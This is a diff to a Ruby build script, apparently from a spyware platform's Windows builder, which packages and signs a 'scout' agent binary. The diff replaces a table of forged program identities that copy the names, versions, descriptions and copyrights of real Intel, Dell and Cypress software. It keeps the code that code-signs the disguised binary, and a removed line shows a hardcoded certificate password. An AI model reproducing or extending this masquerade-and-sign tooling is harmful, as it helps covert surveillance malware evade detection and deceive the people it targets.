@@ -198,7 +198,7 @@ class BuildWindows < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       z.file.open(@appname + (@cooked ? '.cooked' : '.exe'), "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
@@ -211,7 +211,7 @@ class BuildWindows < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
@@ -237,12 +237,13 @@ class BuildWindows < Build
   end
 
   def scout_name(seed)
-    scout_names = [{name: 'CCC', version: '3.5.0.5', desc: 'Catalyst Control Center: Host application',company: 'ATI Technologies Inc.', copyright: '2002-2010'},
-                   {name: 'PDVD9Serv', version: '9.0.3401.1', desc: 'PowerDVD RC Service', company: 'CyberLink Corp.', copyright: 'Copyright (c) CyberLink Corp. 1997-2008'},
-                   {name: 'RtDCpl', version: '1.0.0.12', desc: 'HD Audio Control Panel', company: 'Realtek Semiconductor Corp.', copyright: 'Copyright 2010 (c) Realtek Semiconductor Corp.. All rights reserved.'},
-                   {name: 'sllauncher', version: '5.1.10411.3', desc: 'Microsoft Silverlight Out-of-Browser Launcher', company: 'Microsoft Silverlight', copyright: 'Copyright (c) Microsoft Corporation.All rights reserved.'},
-                   {name: 'WLIDSVCM', version: '7.250.4225.2', desc: 'Microsoft (r) Windows Live ID Service Monitor', company: 'Microsoft (r) CoReXT', copyright: 'Copyright (c) Microsoft Corporation.All rights reserved.'}
-                  ]
+    scout_names = [
+    	{name: 'BTHSAmpPalService', version: '15.5.0.14', desc: 'Intel(r) Centrino(r) Wireless Bluetooth(r) + High Speed Virtual Adapter', company: 'Intel Corporation', copyright: 'Copyright (c) Intel Corporation 2012'},
+    	{name: 'CyCpIo', version: '2.5.0.16', desc: 'Trackpad Bus Monitor', company: 'Cypress Semiconductor Corporation', copyright: 'Copyright (c) 2012 Cypress Semiconductor Corporation'},
+    	{name: 'CyHidWin', version: '2.5.0.16', desc: 'Trackpad Gesture Engine Monitor', company: 'Cypress Semiconductor Inc.', copyright: '(c) 2012 Cypress Semiconductor Inc. All rights reserved.'},
+    	{name: 'iSCTsysTray', version: '3.0.30.1526', desc: 'Intel(r) Smart Connect Technology System Tray Notify Icon', company: 'Intel Corporation', copyright: 'Copyright (c) 2011 Intel Corporation'},
+    	{name: 'quickset', version: '11.1.27.2', desc: 'QuickSet', company: 'Dell Inc.', copyright: '(c) 2010 Dell Inc.'}
+    ]
 
     scout_names[seed.ord % scout_names.size]
   end
@@ -430,8 +431,7 @@ class BuildWindows < Build
     #CrossPlatform.exec path('packer32'), "#{path('scout')}"
 
     # sign it
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("digicert.cer")} #{path('scout')}" if to_be_signed?
-    #CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
